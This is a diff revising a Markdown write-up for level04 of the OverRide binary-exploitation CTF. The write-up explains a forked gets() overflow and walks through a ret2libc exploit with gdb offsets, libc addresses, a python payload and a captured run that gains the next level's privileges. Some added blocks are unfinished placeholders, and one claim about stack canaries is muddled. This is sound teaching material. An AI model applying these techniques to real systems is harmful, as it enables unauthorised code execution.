@@ -31,7 +31,7 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ^C
 ```
 
-The program asks for a shellcode, and look like the stop a fork process.
+The program asks for a shellcode, and appears to stop a forked child process.
 
 ## 2. Analyze The Executable
 
@@ -52,15 +52,34 @@ Here, we find only the function: `main`.
 
 #### main function
 
-The `main` function first launch a `fork()` process. If the process is the child process, it calls `ptrace(PTRACE_TRACEME,0,0,0)` to follow it own process. Then `gets()` the input of the user. If not, it `wait` the fork process, then stop the program (by )....
+The `main` function first launches a `fork()` process. If the process is the child process, it calls `ptrace(PTRACE_TRACEME,0,0,0)` to trace its own process.
+Then it reads user input with `gets()`.
 
-## 3. Identify The Vulnerability
+If not *(parent process)*, *it waits for the child process to finish, then exits.*
+```c
+ERROR NOT FINISHED:
+      wait(&local_a4);
+      local_20 = local_a4;
+      if (((local_a4 & 0x7f) == 0) ||
+         (local_1c = local_a4, '\0' < (char)(((byte)local_a4 & 0x7f) + 1) >> 1)) {
+        puts("child is exiting...");
+        return 0;
+      }
+      local_18 = ptrace(PTRACE_PEEKUSER,local_14,0x2c,0);
+    } while (local_18 != 0xb);
+    puts("no exec() for you");
+    kill(local_14,9);
+```
 
-For this level, we gonna use a new attack : **ret2libc**.
+
+## 3. Exploit Development
+
+For this level, we will use a new attack : **ret2libc**.
 
 ### RET2LIBC Explanation
 
-The `ret2libc`, or return to the library C, use the function and string stored in the C library. The payload is as follow :
+The `ret2libc` *(return-to-libc)* attack uses functions and strings stored in the C library. The payload is as follow :
+
 ```
 [ padding ] [ system() address ] [ ret address of system() ] [ "/bin/sh" address ]
 └────┬────┘ └─────────┬────────┘ └────────────┬────────────┘ └─────────┬─────────┘
@@ -69,13 +88,25 @@ The `ret2libc`, or return to the library C, use the function and string stored i
 The size of padding depends on how many bytes it need to overflow on the saved EIP.
 ```
 
-The idea is to overwrite saved EIP with the system() address to redirect the process to it. Aside of the system() address, we putting where we want the process to go after the system() function, and next to it it the argument of the system() calls.
+- **padding**: Fills the buffer until we reach the saved EIP.
+- **system() address**: Overwrites saved EIP to redirect execution to `system()`.
+- **return address**: Where to go after `system()` returns *(typically `exit()`)*.
+- **"/bin/sh" address**: Argument passed to `system()`.
 
-The `ret address` is there to secure the attack from the NX process, that detect is the program value has change during the process.
+```
+ERROR NOT FINISHED:
+```
+
+The `return address` is where execution should go after `system()` returns *(typically `exit()` to cleanly terminate)*. *It's secure from STACK CANARY.*
 
 To understand why this information are in this order, we need to observe what's happening during a new call in the stack.
 
 #### Stack New Function Call
+
+```
+ERROR NOT FINISHED:
+toutes les explications de ca, oskour
+```
 
 Stack on function 1:
 ```
@@ -174,7 +205,7 @@ Donc lors de la ret2libc attack, il se passe :
 
 ### Get Exploit Values
 
-First we need to determiner the size of the padding.
+First, we need to determine the size of the padding.
 
 ```bash
 (gdb) set follow-fork-mode child
@@ -191,11 +222,11 @@ Program received signal SIGSEGV, Segmentation fault.
 
 `set follow-fork-mode child` is a gdb command that allows to continue the debugging in the child process (in case of fork() calls).
 
-`0x4e` is 78 in decimal and `N` in ASCII. So we got a offset of `156 bytes`.
+`0x4e` is 78 in decimal and `N` in ASCII. So we got an offset of `156 bytes`.
 
 ---
 
-Then lets found the addresses of the payload.
+Then let's find the addresses for the payload.
 
 ```bash
 (gdb) r <<< $(python -c 'print "a" * 156 + "BBBB"')
@@ -212,9 +243,10 @@ $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 $1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 ```
 
-We found the address of system : `` and exit : ``.
+We found the address of system : `0xf7e6aed0` and exit : `0xf7e5eb70`.
 
-To get the address of the string "/bin/sh" is more difficult:
+Getting the address of the string `"/bin/sh"` is more complex :
+
 ```bash
 (gdb) info proc map
 process 1949
@@ -242,7 +274,8 @@ Mapped address spaces:
 1 pattern found.
 ```
 
-We need the the mapped address of the process, to found the address of the `libc` :
+We need the mapped address of the process to find the address of `libc` :
+
 ```bash
 	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
 ```
@@ -255,14 +288,15 @@ Then we use the command `find` of gdb *(search a word between the start and end 
 python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'
 ```
 
-But the address of `exit` is not important in this level :
+The `exit` address is not critical in this level since we just need the shell to spawn. We can use dummy bytes (`"bbbb"`) instead :
+
 ```bash
 python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "b" * 4 + "\xf7\xf8\x97\xec"[::-1]'
 ```
 
 ### Attack Visualization
 
-[img - ]
+![img](Ressources/level04-overflow.png)
 
 ## 4. Capture The Flag
 
@@ -270,7 +304,7 @@ python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "b" * 4 + "\xf7\xf8\x97\
 level04@OverRide:~$ (python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "b" * 4 + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04 
 Give me some shellcode, k
 id
-cuid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
+uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
 cat /home/users/level05/.pass
 XXX
 ^C
